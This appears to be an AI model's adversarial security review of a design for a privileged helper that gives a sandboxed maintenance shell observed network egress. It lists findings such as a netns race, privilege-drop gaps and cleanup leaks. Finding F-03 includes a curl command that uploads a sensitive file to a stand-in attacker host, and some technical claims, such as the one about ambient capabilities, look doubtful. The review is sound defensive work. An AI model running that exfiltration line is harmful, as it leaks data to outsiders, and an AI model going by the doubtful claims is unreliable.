# observed-route DESIGN panel: google/gemini-2.5-pro

_finish=stop seconds=76.1 cost=$0.0978 usage={'prompt_tokens': 18263, 'completion_tokens': 7497, 'total_tokens': 25760, 'cost': 0.09779875, 'is_byok': False, 'prompt_tokens_details': {'cached_tokens': 0, 'cache_write_tokens': 0, 'audio_tokens': 0, 'video_tokens': 0}, 'cost_details': {'upstream_inference_cost': 0.09779875, 'upstream_inference_prompt_cost': 0.02282875, 'upstream_inference_completions_cost': 0.07497}, 'completion_tokens_details': {'reasoning_tokens': 4064, 'image_tokens': 0, 'audio_tokens': 0}}_

This is an excellent and challenging design brief. As requested, I will review it from an adversarial perspective, assuming the author is wrong until proven otherwise.

My review is structured into two parts: (A) concrete findings on the design's safety and correctness, and (B) a meta-level judgment on whether the proposed trade-off is worth the risk and complexity.

***

### (A) Concrete Findings

#### Finding 1
*   **ID:** F-01
*   **TITLE:** Critical Flaws in Privileged Helper Boundary
*   **SEVERITY:** CRITICAL
*   **WHERE:** Design Step 1 (The privileged host helper)
*   **CONCRETE ATTACK OR FLAW:** The "drop privileges and exec" pattern is notoriously difficult to get right. The design is missing several critical steps, leaving multiple paths to privilege retention or escape.
    1.  **TOCTOU Race on Netns Path:** The helper creates the netns (`ip netns add salient_route_...`), which creates a file at `/run/netns/salient_route_...`. It then performs other setup before finally calling `setns()` on that *path*. An attacker with access to the host filesystem (even as the collaborator user) can race this window: between creation and `setns()`, they can `rename()` the legitimate netns file and replace it with a symlink to a different netns file, such as `/proc/1/ns/net` (the host netns). The helper would then `setns()` into the host netns, drop privileges, and execute the bwrap sandbox *on the host network*, completely bypassing the intended isolation.
    2.  **Incomplete Privilege Drop:** The design specifies `setgroups([])`, `setgid`, `setuid`. This is insufficient for a process that started as root. The helper retains its full capability sets (effective, permitted, inheritable, bounding, ambient) until the `setuid` call. After `setuid` to a non-zero UID, most capabilities are dropped, but **ambient capabilities are not**. If the helper (or the `sudo` environment that launched it) has any ambient capabilities, they will be preserved across the `setuid` and inherited by the `exec`'d `bwrap` process. This could grant the payload capabilities that `bwrap`'s `--cap-drop ALL` was not expecting to have to deal with, potentially undermining its sandboxing.
    3.  **Missing `no_new_privs`:** The `maintain.py` sandbox relies on `bwrap` setting `PR_SET_NO_NEW_PRIVS` to defang setuid binaries inside the sandbox. However, the privileged helper itself does not set this before it `exec`s `bwrap`. If an attacker could modify the `/usr/bin/bwrap` binary on disk to be, for example, a setuid-root shell, the `exec` from the helper would grant that shell root privileges. The helper must set `no_new_privs` on itself before calling `exec`.
*   **WHETHER ANOTHER CONTROL CATCHES IT:** No. These are fundamental flaws in the privileged-to-unprivileged transition. The in-child guard inside `bwrap` cannot detect that it was placed in the wrong netns, nor can it retroactively fix a compromised `bwrap` binary that was `exec`d without `no_new_privs`.
*   **FIX-OR-REDESIGN:**
    *   **Fix (TOCTOU):** The helper must `open()` the netns file immediately after creation to get a file descriptor. All subsequent operations, including the final `setns()`, must use the file descriptor, not the path.
    *   **Fix (Priv-Drop):** The privilege drop sequence must be comprehensive:
        1.  Drop all possible capabilities from all sets (bounding, effective, permitted, inheritable).
        2.  Clear the ambient capability set: `prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_CLEAR_ALL, 0, 0, 0)`.
        3.  Call `setgroups([])`, `setgid(...)`, `setuid(...)`.
        4.  Verify the UID/GID drop was successful.
    *   **Fix (`no_new_privs`):** The helper must call `prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)` before the `exec` call.

---

#### Finding 2
*   **ID:** F-02
*   **TITLE:** Impossible Verification Claim Breaks Fail-Closed Promise
*   **SEVERITY:** CRITICAL
*   **WHERE:** Design Step 3 (Verification + the honest fallback ladder)
*   **CONCRETE ATTACK OR FLAW:** The design claims the "in-child guard emits a POSITIVE token only after it verifies the netns is the prepared one AND the observer is live". The second part of this is impossible. An unprivileged process inside a network namespace has no ability to inspect the host's `nftables` ruleset. It cannot verify that the `FORWARD` hook, the `policy drop`, or the masquerade rule are correctly installed in the host netns. Therefore, the positive token emitted by the child is a false claim of end-to-end verification. This breaks the entire "fail-closed" model for the observer. A failure in the privileged helper that sets up the route but *fails* to install the `nft` observer hook would result in a **routed but unobserved** egress path, and the child guard would happily emit its token, leading the system to believe the session was observed.
*   **WHETHER ANOTHER CONTROL CATCHES IT:** No. This is the core of the "verified observed" guarantee, and it is based on a false premise. The fallback ladder is corrupted because the system can be in the `OBSERVED_ROUTE` state according to the token, when in reality it is in a new, dangerous "routed but unobserved" state.
*   **FIX-OR-REDESIGN:** Redesign. The verification logic must move. The **privileged helper** is the only entity that can verify the full setup. The correct sequence is:
    1.  Helper (as root) installs all network resources (veth, IPs).
    2.  Helper (as root) installs all `nft` rules.
    3.  Helper (as root) **reads back** the `nft` ruleset to verify the observer hook and policy are active.
    4.  Only after this verification does the helper proceed to `setns`, drop privileges, and `exec` the payload.
    The child's token can only attest to properties of its own environment (e.g., its caps are dropped), not the host's.

---

#### Finding 3
*   **ID:** F-03
*   **TITLE:** Architectural Guarantee of Egress Governance Is Fundamentally Weakened
*   **SEVERITY:** HIGH
*   **WHERE:** The Trade-off (Re-opens an IP egress channel)
*   **CONCRETE ATTACK OR FLAW:** This is not a bug in the mechanism but a flaw in the architectural trade. The current system's strongest guarantee is "all IP egress is content-mediated by `egress.py`." This proposal changes it to "some IP egress is content-mediated, and some is only destination-logged." This quietly demotes the egress governance model from enforcement to mere audit.
    *   **Attack:** An attacker who gains execution in a human-approved maintenance shell can now exfiltrate arbitrary data that `egress.py` would have blocked. For example: `curl -d@/path/to/sensitive/data https://attacker.host/upload`. The existing `net.post` capability system would prevent `egress.py` from POSTing to an unapproved host. The new observed route allows this, logging only the destination IP and port (`<attacker_ip>:443`). The audit trail is now significantly less meaningful; it proves *that* a connection was made, but provides no evidence about *what* was sent or whether it was malicious. This is a major regression in security posture.
*   **WHETHER ANOTHER CONTROL CATCHES IT:** No. This *is* the change. The design acknowledges this trade, but the severity of the regression is understated. It invalidates the core premise that the SalienceOS control plane has fine-grained, policy-based control over data leaving the machine.
*   **FIX-OR-REDESIGN:** This is a product/policy decision, but from a security engineering standpoint, this trade is likely not worth it. The fix is to choose a different alternative. If network access is required, it should be mediated with the same fidelity as `egress.py`. A transparent proxy that can inspect SNI and enforce hostname-based allowlists would be a much more coherent evolution of the security model than this bulk, uninspected channel.

---

#### Finding 4
*   **ID:** F-04
*   **TITLE:** Resource Leaks from Helper Crash Lead to Unsandboxed Egress
*   **SEVERITY:** HIGH
*   **WHERE:** Design Step 1 & 5 (Helper lifecycle and teardown)
*   **CONCRETE ATTACK OR FLAW:** The design mentions teardown "on exit" but is not specific about failure modes. The privileged helper is a single process that sets up resources and then `exec`s `bwrap`. If the `bwrap` process (or the user's shell within it) is killed with `SIGKILL`, or the helper itself crashes before `exec`, the teardown logic may not run. This will leak kernel resources on the host:
    1.  The `veth` pair (`sr<runid>H`).
    2.  The `nft` rules, including the `FORWARD` accept rule and the masquerade rule.
    3.  The `net.ipv4.ip_forward=1` sysctl setting.
    A subsequent, unrelated process run by the same user could potentially discover and use this leftover routed interface if it is not properly sandboxed, gaining unobserved network access. More critically, leaving `ip_forward=1` on a host that doesn't expect it can have wide-ranging security implications.
*   **WHETHER ANOTHER CONTROL CATCHES IT:** No. This is a state-leakage vulnerability. The `runid` scoping helps, but a garbage collection mechanism is required for robustness.
*   **FIX-OR-REDESIGN:**
    *   **Fix:** The helper should use a `fork/exec/wait` pattern instead of a direct `exec`. The parent process (still privileged) waits for the child (`bwrap`) to terminate. The `finally` block of the parent's logic is then responsible for tearing down all created resources (`nft` rules, veth pair, resetting `ip_forward` if it was the one to set it). This ensures cleanup happens even if the child exits unexpectedly.
    *   **Redesign:** A system-level daemon or periodic cron job should be implemented to garbage-collect any stale `salient_route_*` network objects and `nft` rules to handle the case where the helper parent itself is killed.

---

#### Finding 5
*   **ID:** F-05
*   **TITLE:** Observer Blind Spots for Non-Port Protocols
*   **SEVERITY:** MEDIUM
*   **WHERE:** Design Step 2 & 3 (The rebuilt observer, FORWARD policy)
*   **CONCRETE ATTACK OR FLAW:** The observer hook is described as recording `ip daddr . dport`. The `FORWARD` policy is described as accepting "TCP+UDP established/new, ICMP for PMTU". This is a good start, but it creates a potential gap. What if the `FORWARD` accept rule allows other IP protocols (e.g., GRE `IPPROTO_GRE`, SCTP `IPPROTO_SCTP`) for legitimate maintenance reasons, but the observer hook only logs TCP/UDP destinations? This would create an unobserved channel. Any packet that is `ACCEPT`ed by the `FORWARD` chain but not logged by the observer hook constitutes a failure of the "fully observed" claim.
*   **WHETHER ANOTHER CONTROL CATCHES IT:** No, the `FORWARD policy drop` is the main defense, but the flaw is in the mismatch between the `ACCEPT` rules and the observer's capabilities.
*   **FIX-OR-REDESIGN:**
    *   **Fix:** The `nft` `FORWARD` chain rules must be designed as a single, atomic unit. The set of `ACCEPT` rules must be *strictly limited* to protocols and states that the observer hook can and does log. For any protocol without ports (like ICMP, GRE), the observer must log at least the destination IP and protocol number. The design must be explicit: "The `FORWARD` chain will only `ACCEPT` traffic that the observer hook is guaranteed to record."

***

### (B) Meta-Question: Is This Worth Building?

**No.**

The proposed architecture introduces a significant amount of complexity and risk for a convenience feature. The core issues are:

1.  **New Privileged Attack Surface:** A custom-written, privileged helper that manipulates core networking state is one of the highest-risk components one can add to a secure system. The number of subtle failure modes (races, incomplete cleanup, privilege drop errors) is vast, as demonstrated by the findings above. The existing `egressobserver.py` uses `sudo -n` for a much simpler, more constrained task (manipulating a single `nft` table). This helper is doing far more.
2.  **Fundamental Security Regression:** The design knowingly trades a strong, content-aware enforcement guarantee for a weak, destination-only audit log. This undermines the coherence of the entire SalienceOS egress governance model and makes the audit trail significantly less trustworthy. An IP:port pair is not sufficient evidence to rule out malicious exfiltration.
3.  **Safer Alternatives Were Dismissed Too Quickly:** The document rejects `pasta`/`slirp4netns` because it's a "new external dependency". This is a weak argument when the alternative is building a high-risk privileged component from scratch. A well-maintained, unprivileged, userspace networking tool like `pasta` contains failures to the user's own security context. It requires no root privileges and has a much smaller and better-understood attack surface than kernel-level networking manipulation. The security cost of the proposed helper far outweighs the "discipline" cost of adding a dependency.

The "do nothing" alternative (keeping maintenance network-less) preserves the strong security posture. If network access is a hard requirement, the `pasta` alternative is architecturally superior from a security standpoint.

### Steelman & Verdict

**STEELMAN:** This design provides a crucial developer convenience with a well-understood and auditable trade-off. By using a dedicated veth and a host-level `FORWARD` hook, it achieves stronger, unbypassable attribution than the existing `skuid` observer and contains all egress to a single, logged chokepoint. The privileged helper is tightly scoped to fixed setup and immediately drops privileges, representing a minimal, necessary trust expansion for a significant gain in usability.

**VERDICT:** **SERIOUS_FLAWS.** The proposal introduces a complex, high-risk privileged helper with multiple, critical vulnerabilities in its security boundary and verification model, while fundamentally weakening the system's overall egress guarantees.

**The single highest-value change:** **Do the alternative: `pasta` (userspace networking).** It achieves the goal of providing network access without requiring a new privileged helper and without leaving the security holes inherent in the proposed design. The cost of a new dependency is trivial compared to the cost of getting a privileged network-setup utility wrong.
